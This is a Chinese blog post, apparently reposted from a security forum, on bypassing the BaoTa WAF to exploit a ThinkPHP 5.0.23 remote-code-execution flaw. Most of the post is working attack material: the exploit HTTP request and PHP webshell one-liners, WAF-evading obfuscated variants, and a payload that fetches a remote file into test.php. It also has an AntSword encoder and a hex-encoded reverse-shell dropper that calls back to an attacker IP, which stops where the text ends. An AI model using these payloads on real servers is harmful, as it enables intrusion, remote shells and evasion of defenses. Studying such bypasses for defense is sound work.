<!DOCTYPE html>





<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">

<link rel="stylesheet" href="/css/main.css?v=7.4.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.4.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: '',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: '复制',
      copy_success: '复制成功',
      copy_failure: '复制失败'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="最先发在t00ls上，空闲时间迁了过来 0 起因最近在渗透一个站，是Thinkphp 5.0.23的架构， 本来是用Poc直接打就完事了，无奈遇上了宝塔的防火墙，各种敏感函数各种过滤，看了网上一些教程，试了试并没法绕过最新的BT WAF">
<meta name="keywords" content="宝塔,Thinkphp,绕过">
<meta property="og:type" content="article">
<meta property="og:title" content="Thinkphp RCE绕过宝塔面板的姿势分享">
<meta property="og:url" content="https://www.skactor.tk/2019/08/24/Thinkphp Rce绕过宝塔面板的姿势分享/index.html">
<meta property="og:site_name" content="Skactor&#39;s Blog">
<meta property="og:description" content="最先发在t00ls上，空闲时间迁了过来 0 起因最近在渗透一个站，是Thinkphp 5.0.23的架构， 本来是用Poc直接打就完事了，无奈遇上了宝塔的防火墙，各种敏感函数各种过滤，看了网上一些教程，试了试并没法绕过最新的BT WAF">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://www.skactor.tk/2019/08/24/Thinkphp%20Rce绕过宝塔面板的姿势分享/1566489694896.png">
<meta property="og:image" content="https://www.skactor.tk/2019/08/24/Thinkphp%20Rce绕过宝塔面板的姿势分享/1566403268447.png">
<meta property="og:image" content="https://www.skactor.tk/2019/08/24/Thinkphp%20Rce绕过宝塔面板的姿势分享/1566488843561.png">
<meta property="og:image" content="https://www.skactor.tk/2019/08/24/Thinkphp%20Rce绕过宝塔面板的姿势分享/1566567424504.png">
<meta property="og:image" content="https://www.skactor.tk/2019/08/24/Thinkphp%20Rce绕过宝塔面板的姿势分享/1566567405030.png">
<meta property="og:image" content="https://www.skactor.tk/2019/08/24/Thinkphp%20Rce绕过宝塔面板的姿势分享/1566569823871.png">
<meta property="og:updated_time" content="2019-09-22T05:18:00.965Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Thinkphp RCE绕过宝塔面板的姿势分享">
<meta name="twitter:description" content="最先发在t00ls上，空闲时间迁了过来 0 起因最近在渗透一个站，是Thinkphp 5.0.23的架构， 本来是用Poc直接打就完事了，无奈遇上了宝塔的防火墙，各种敏感函数各种过滤，看了网上一些教程，试了试并没法绕过最新的BT WAF">
<meta name="twitter:image" content="https://www.skactor.tk/2019/08/24/Thinkphp%20Rce绕过宝塔面板的姿势分享/1566489694896.png">
  <link rel="canonical" href="https://www.skactor.tk/2019/08/24/Thinkphp Rce绕过宝塔面板的姿势分享/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: false,
    isPost: true,
    isPage: false,
    isArchive: false
  };
</script>

  <title>Thinkphp RCE绕过宝塔面板的姿势分享 | Skactor's Blog</title>
  








  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <div class="container use-motion">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Skactor's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
      
      
      
        
        <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
      
      
      
        
        <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>
  </ul>

    

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
      <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block post">
    <link itemprop="mainEntityOfPage" href="https://www.skactor.tk/2019/08/24/Thinkphp Rce绕过宝塔面板的姿势分享/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Skactor">
      <meta itemprop="description" content="专注信息安全">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Skactor's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">Thinkphp RCE绕过宝塔面板的姿势分享

          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              
                
              

              <time title="创建时间：2019-08-24 16:17:08" itemprop="dateCreated datePublished" datetime="2019-08-24T16:17:08+08:00">2019-08-24</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2019-09-22 13:18:00" itemprop="dateModified" datetime="2019-09-22T13:18:00+08:00">2019-09-22</time>
              </span>
            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/原创/" itemprop="url" rel="index"><span itemprop="name">原创</span></a></span>

                
                
                  ，
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/原创/渗透/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a></span>

                
                
              
            </span>
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>最先发在t00ls上，空闲时间迁了过来</p>
<h2 id="0-起因"><a href="#0-起因" class="headerlink" title="0 起因"></a>0 起因</h2><p>最近在渗透一个站，是Thinkphp 5.0.23的架构， 本来是用Poc直接打就完事了，无奈遇上了宝塔的防火墙，各种敏感函数各种过滤，看了网上一些教程，试了试并没法绕过最新的BT WAF</p>
<a id="more"></a>
<h2 id="1-工具和环境"><a href="#1-工具和环境" class="headerlink" title="1 工具和环境"></a>1 工具和环境</h2><p>渗透环境是PHP7.2+Thinkphp 5.0.23+最新版的BT WAF</p>
<p>本过程中使用的工具主要有：BurpSuite、中国蚁剑</p>
<h2 id="2-测试过程"><a href="#2-测试过程" class="headerlink" title="2 测试过程"></a>2 测试过程</h2><h3 id="2-1-环境"><a href="#2-1-环境" class="headerlink" title="2.1 环境"></a>2.1 环境</h3><p>这是我本地搭建的测试环境，可以看到是php7.2版本，Thinkphp版本是5.0.23，刚好在RCE的攻击范围内</p>
<img src="/2019/08/24/Thinkphp%20Rce绕过宝塔面板的姿势分享/1566489694896.png" class="1566489694896">

<p>开始的时候一切都很顺利，直接使用POC查看phpinfo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?s=captcha&amp;aaa=id HTTP/1.1</span><br><span class="line">Host: rank.localtest.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0)Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.8,en;q=0.5,zh-SG;q=0.3</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded </span><br><span class="line">Content-Length: 85</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=call_user_func&amp;method=get&amp;server[REQUEST_METHOD]=phpinfo</span><br></pre></td></tr></table></figure>

<img src="/2019/08/24/Thinkphp%20Rce绕过宝塔面板的姿势分享/1566403268447.png" class="1566403268447">

<p>但是当我使用攻击性Poc的时候</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=call_user_func&amp;method=get&amp;server[REQUEST_METHOD]=&lt;?php eval($_POST[x]);?&gt;</span><br></pre></td></tr></table></figure>

<p>我们的请求被残忍的阻断了</p>
<img src="/2019/08/24/Thinkphp%20Rce绕过宝塔面板的姿势分享/1566488843561.png" class="1566488843561">

<p>所以我们需要找一个宝塔查不出来的Shell</p>
<h3 id="2-2-宝塔规则模拟"><a href="#2-2-宝塔规则模拟" class="headerlink" title="2.2 宝塔规则模拟"></a>2.2 宝塔规则模拟</h3><p>本着深入研究的精神，我在本地虚拟环境装了一个宝塔面板，把里面的规则提取出来写了个脚本进行检测，由于其对POST和GET的过滤基本一致，我们就随便选一个提取就完事了，规则文件在<code>/www/server/btwaf/rule/</code>目录</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">value = <span class="string">'&lt;?php file_get_contents ('</span></span><br><span class="line"></span><br><span class="line">regex = &#123;</span><br><span class="line">    <span class="string">'0.目录保护1'</span>: <span class="string">'\\.\\./\\.\\./'</span>,</span><br><span class="line">    <span class="string">'1.SQL注入过滤1'</span>: <span class="string">'\\s+(or|xor|and)\\s+.*(=|&lt;|&gt;|\\\'")'</span>,</span><br><span class="line">    <span class="string">'2.目录保护2'</span>: <span class="string">'/\\*'</span>,</span><br><span class="line">    <span class="string">'3.目录保护3'</span>: <span class="string">'(?:etc\\/\\W*passwd)'</span>,</span><br><span class="line">    <span class="string">'4.PHP流协议过滤1'</span>: <span class="string">'(gopher|doc|php|glob|file|phar|zlib|ftp|ldap|dict|ogg|data)\\:\\/'</span>,</span><br><span class="line">    <span class="string">'5.一句话木马过滤1'</span>: <span class="string">'\\:\\$'</span>,</span><br><span class="line">    <span class="string">'6.一句话木马过滤2'</span>: <span class="string">'\\$\\&#123;'</span>,</span><br><span class="line">    <span class="string">'7.一句话*屏蔽的关键字*过滤1'</span>: <span class="string">'base64_decode\\('</span>,</span><br><span class="line">    <span class="string">'8.一句话*屏蔽的关键字*过滤2'</span>: <span class="string">'(?:define|eval|file_get_contents|include|require_once|shell_exec|phpinfo|system|passthru|chr|char|preg_\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog|file_put_contents|fopen|urldecode|scandir)\\('</span>,</span><br><span class="line">    <span class="string">'9.一句话*屏蔽的关键字*过滤3'</span>: <span class="string">'\\$_(GET|post|cookie|files|session|env|phplib|GLOBALS|SERVER)'</span>,</span><br><span class="line">    <span class="string">'10.SQL注入过滤1'</span>: <span class="string">'\\s+(or|xor|and)\\s+(=|&lt;|&gt;|\'|")'</span>,</span><br><span class="line">    <span class="string">'11.SQL注入过滤2'</span>: <span class="string">'select\\s+.+(from|limit)\\s+'</span>,</span><br><span class="line">    <span class="string">'12.SQL注入过滤3'</span>: <span class="string">'(?:(union(.*?)select))'</span>,</span><br><span class="line">    <span class="string">'13.SQL注入过滤5'</span>: <span class="string">'sleep\\((\\s*)(\\d*)(\\s*)\\)'</span>,</span><br><span class="line">    <span class="string">'14.SQL注入过滤6'</span>: <span class="string">'benchmark\\((.*)\\,(.*)\\)'</span>,</span><br><span class="line">    <span class="string">'15.SQL注入过滤7'</span>: <span class="string">'(?:from\\W+information_schema\\W)'</span>,</span><br><span class="line">    <span class="string">'16.SQL注入过滤8'</span>: <span class="string">'(?:(?:current_)user|database|concat|extractvalue|polygon|updatexml|geometrycollection|schema|multipoint|multipolygon|connection_id|linestring|multilinestring|exp|right|sleep|group_concat|load_file|benchmark|file_put_contents|urldecode|system|file_get_contents|select|substring|substr|fopen|popen|phpinfo|user|alert|scandir|shell_exec|eval|execute|concat_ws|strcmp|right)\\s*\\('</span>,</span><br><span class="line">    <span class="string">'17.SQL注入过滤9'</span>: <span class="string">'into(\\s+)+(?:dump|out)file\\s*'</span>,</span><br><span class="line">    <span class="string">'18.SQL注入过滤10'</span>: <span class="string">'group\\s+by\\s+\\d'</span>,</span><br><span class="line">    <span class="string">'19.XSS过滤1'</span>: <span class="string">'\\&lt;(iframe|script|body|img|layer|div|meta|style|base|object|input)'</span>,</span><br><span class="line">    <span class="string">'20.XSS过滤2'</span>: <span class="string">'(onmouseover|onerror|onload)\\='</span>,</span><br><span class="line">    <span class="string">'21.SQL报错注入过滤01'</span>: <span class="string">'(extractvalue\\(|concat\\(|user\\(\\)|substring\\(|count\\(\\*\\)|substring\\(hex\\(|updatexml\\()'</span>,</span><br><span class="line">    <span class="string">'22.SQL报错注入过滤02'</span>: <span class="string">'(@@version|load_file\\(|NAME_CONST\\(|exp\\(\\~|floor\\(rand\\(|geometrycollection\\(|multipoint\\(|polygon\\(|multipolygon\\(|linestring\\(|multilinestring\\(|right\\()'</span>,</span><br><span class="line">    <span class="string">'23.SQL注入过滤10'</span>: <span class="string">'(substr\\()'</span>,</span><br><span class="line">    <span class="string">'24.SQL注入过滤1'</span>: <span class="string">'(ORD\\(|MID\\(|IFNULL\\(|CAST\\(|CHAR\\()'</span>,</span><br><span class="line">    <span class="string">'25.SQL注入过滤1'</span>: <span class="string">'(EXISTS\\(|SELECT\\#|\\(SELECT|select\\()'</span>,</span><br><span class="line">    <span class="string">'26.菜刀流量过滤'</span>: <span class="string">'(array_map\\("ass)'</span>,</span><br><span class="line">    <span class="string">'27.SQL注入过滤1'</span>: <span class="string">'\\|+\\s+[\\w\\W]+=[\\w\\W]+'</span>,</span><br><span class="line">    <span class="string">'28.SQL报错注入过滤01'</span>: <span class="string">'(bin\\(|ascii\\(|benchmark\\(|concat_ws\\(|group_concat\\(|strcmp\\(|left\\(|datadir\\(|greatest\\()'</span>,</span><br><span class="line">    <span class="string">'29.'</span>: <span class="string">'(?:from.+?information_schema.+?)'</span>,</span><br><span class="line">    <span class="string">'30.SQL注入过滤8'</span>: <span class="string">'(?:(?:current_)user|database|schema|connection_id)\\s*\\('</span>,</span><br><span class="line">    <span class="string">'31.SQL注入过滤10'</span>: <span class="string">'group\\s+by.+\\('</span>,</span><br><span class="line">    <span class="string">'32.SQL报错注入过滤01'</span>: <span class="string">'(extractvalue\\(|concat\\(0x|user\\(\\)|substring\\(|count\\(\\*\\)|substring\\(hex\\(|updatexml\\()'</span>,</span><br><span class="line">    <span class="string">'33.SQL报错注入过滤02'</span>: <span class="string">'(@@version|load_file\\(|NAME_CONST\\(|exp\\(\\~|floor\\(rand\\(|geometrycollection\\(|multipoint\\(|polygon\\(|multipolygon\\(|linestring\\(|multilinestring\\()'</span>,</span><br><span class="line">    <span class="string">'34.SQL注入过滤1'</span>: <span class="string">'(ORD\\(|MID\\(|IFNULL\\(|CAST\\(|CHAR\\))'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name, reg <span class="keyword">in</span> regex.items():</span><br><span class="line">    reg = re.compile(reg, re.I | re.M)</span><br><span class="line">    r = reg.findall(value)</span><br><span class="line">    <span class="keyword">if</span> r:</span><br><span class="line">        print(<span class="string">'规则名：&#123;0&#125;\n规则内容：&#123;1&#125;\n命中内容：&#123;2&#125;'</span>.format(name, reg.pattern, r))</span><br></pre></td></tr></table></figure>

<p>可以看到我们刚才使用的脚本是这样被检测出来的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">规则名：16.SQL注入过滤8</span><br><span class="line">规则内容：(?:(?:current_)user|database|concat|extractvalue|polygon|updatexml|geometrycollection|schema|multipoint|multipolygon|connection_id|linestring|multilinestring|exp|right|sleep|group_concat|load_file|benchmark|file_put_contents|urldecode|system|file_get_contents|select|substring|substr|fopen|popen|phpinfo|user|alert|scandir|shell_exec|eval|execute|concat_ws|strcmp|right)\s*\(</span><br><span class="line">命中内容：[&apos;file_get_contents (&apos;]</span><br></pre></td></tr></table></figure>

<h3 id="2-3-GetShell方法"><a href="#2-3-GetShell方法" class="headerlink" title="2.3 GetShell方法"></a>2.3 GetShell方法</h3><p>这个Poc的GetShell的办法是包含文件，通常是thinkphp的日志文件</p>
<p><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=-1&amp;get[]=../runtime/log/2019xx/xx.log</code></p>
<p>但是这样有时候会有问题，就是thinkphp的日志文件比较大，而且有时候会有很多奇怪的问题阻断代码执行</p>
<p>所以也可以通过thinkphp本身Library中设置Session的方法把脚本写入tmp目录里的Session文件，然后进行包含</p>
<p><code>_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;server[REQUEST_METHOD]=&lt;? phpinfo();?&gt;</code></p>
<h3 id="2-4-绕过方式探究"><a href="#2-4-绕过方式探究" class="headerlink" title="2.4 绕过方式探究"></a>2.4 绕过方式探究</h3><h4 id="2-4-1-Copy函数绕过"><a href="#2-4-1-Copy函数绕过" class="headerlink" title="2.4.1 Copy函数绕过"></a>2.4.1 Copy函数绕过</h4><p><code>_method=__construct&amp;filter[]=call_user_func&amp;method=get&amp;server[REQUEST_METHOD]=&lt;?=copy(&quot;http://192.168.31.174/test.txt&quot;,&quot;test.php&quot;);?&gt;</code></p>
<h4 id="2-4-2-变形一句话"><a href="#2-4-2-变形一句话" class="headerlink" title="2.4.2 变形一句话"></a>2.4.2 变形一句话</h4><p>参考了<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">p师傅的文章</a>，其中提到了php7中<a href="https://www.php.net/manual/zh/migration70.incompatible.php" target="_blank" rel="noopener">表达式执行的顺序</a>的修改，使得现在可以通过(‘phpinfo’)();来执行函数，这样也就绕开了宝塔的限制，所以可以使用以下的一句话<code>&lt;?php eval((&#39;base64_decode&#39;)((&#39;hex2bin&#39;)($_REQUEST[&#39;test&#39;])));?&gt;</code></p>
<h2 id="2-5-AntSword绕过宝塔WAF"><a href="#2-5-AntSword绕过宝塔WAF" class="headerlink" title="2.5 AntSword绕过宝塔WAF"></a>2.5 AntSword绕过宝塔WAF</h2><p>宝塔面板主要是过滤了蚁剑的UserAgent以及参数里的命令，只需要进行简单的编码就可以进行绕过，关键的是必须直接传处理过的值到服务器，所以就需要特殊定制的一句话以及蚁剑的编码器</p>
<p>编码器代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * php::特殊编码器</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">&apos;use strict&apos;;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*/</span><br><span class="line">module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">  let tmp = Buffer.from(Buffer.from(data[&apos;_&apos;]).toString(&apos;base64&apos;)).toString(&apos;hex&apos;);</span><br><span class="line"></span><br><span class="line">  data[pwd] = tmp;</span><br><span class="line"></span><br><span class="line">  delete data[&apos;_&apos;];</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与之对应的是php的一句话也需要进行编码处理：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(base64_decode(hex2bin($_POST[<span class="string">'x'</span>])));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-6-绕过禁用函数执行系统命令"><a href="#2-6-绕过禁用函数执行系统命令" class="headerlink" title="2.6 绕过禁用函数执行系统命令"></a>2.6 绕过禁用函数执行系统命令</h3><p>BT默认禁用了很多的函数，主要有以下函数：</p>
<p><code>passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru</code></p>
<p>参考了<a href="https://mochazz.github.io/2018/09/27/渗透测试之绕过PHP的disable_functions/" target="_blank" rel="noopener">mochazz的文章</a>可以得知，如果开启了 <strong>pcntl</strong> 扩展，就可以利用 <strong>pcntl_exec</strong> 函数来执行命令，当然要想利用这种方法的话还是有些限制的（ <strong>PHP 4 &gt;= 4.2.0, PHP 5 on linux</strong> ），以下是可以使用pcntl反弹shell的脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*******************************</span></span><br><span class="line"><span class="comment">*查看phpinfo编译参数--enable-pcntl</span></span><br><span class="line"><span class="comment">*作者 Spider</span></span><br><span class="line"><span class="comment">*nc -vvlp 443</span></span><br><span class="line"><span class="comment">********************************/</span></span><br><span class="line">$ip = <span class="string">'xxx.xxx.xxx.xxx'</span>;</span><br><span class="line">$port = <span class="string">'443'</span>;</span><br><span class="line">$file = <span class="string">'/tmp/bc.pl'</span>;</span><br><span class="line">header(<span class="string">"content-Type: text/html; charset=gb2312"</span>);</span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">'pcntl_exec'</span>)) &#123;</span><br><span class="line">$data = <span class="string">"\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x20\x2d\x77\x0d\x0a\x23\x0d\x0a"</span>.</span><br><span class="line"><span class="string">"\x0d\x0a\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74\x3b\x20\x20\x20\x20\x0d\x0a\x75\x73\x65\x20"</span>.</span><br><span class="line"><span class="string">"\x53\x6f\x63\x6b\x65\x74\x3b\x0d\x0a\x75\x73\x65\x20\x49\x4f\x3a\x3a\x48\x61\x6e\x64\x6c\x65"</span>.</span><br><span class="line"><span class="string">"\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x20\x3d\x20\x27"</span>.$ip.</span><br><span class="line"><span class="string">"\x27\x3b\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x20\x3d\x20\x27"</span>.$port.</span><br><span class="line"><span class="string">"\x27\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x70\x72\x6f\x74\x6f\x20\x3d\x20\x67\x65\x74\x70\x72"</span>.</span><br><span class="line"><span class="string">"\x6f\x74\x6f\x62\x79\x6e\x61\x6d\x65\x28\x22\x74\x63\x70\x22\x29\x3b\x0d\x0a\x6d\x79\x20\x24"</span>.</span><br><span class="line"><span class="string">"\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x20\x3d\x20\x73\x6f\x63\x6b\x61\x64\x64\x72\x5f\x69\x6e"</span>.</span><br><span class="line"><span class="string">"\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x2c\x20\x69\x6e\x65\x74\x5f\x61\x74\x6f"</span>.</span><br><span class="line"><span class="string">"\x6e\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x29\x29\x3b\x0d\x0a\x6d\x79\x20\x24\x73\x68"</span>.</span><br><span class="line"><span class="string">"\x65\x6c\x6c\x20\x3d\x20\x27\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x27\x3b\x0d\x0a\x73\x6f"</span>.</span><br><span class="line"><span class="string">"\x63\x6b\x65\x74\x28\x53\x4f\x43\x4b\x2c\x20\x41\x46\x5f\x49\x4e\x45\x54\x2c\x20\x53\x4f\x43"</span>.</span><br><span class="line"><span class="string">"\x4b\x5f\x53\x54\x52\x45\x41\x4d\x2c\x20\x24\x70\x72\x6f\x74\x6f\x29\x3b\x0d\x0a\x53\x54\x44"</span>.</span><br><span class="line"><span class="string">"\x4f\x55\x54\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x53\x4f\x43"</span>.</span><br><span class="line"><span class="string">"\x4b\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x63\x6f\x6e\x6e\x65"</span>.</span><br><span class="line"><span class="string">"\x63\x74\x28\x53\x4f\x43\x4b\x2c\x24\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x29\x20\x6f\x72\x20"</span>.</span><br><span class="line"><span class="string">"\x64\x69\x65\x20\x22\x63\x61\x6e\x20\x6e\x6f\x74\x20\x63\x6f\x6e\x6e\x65\x63\x74\x3a\x24\x21"</span>.</span><br><span class="line"><span 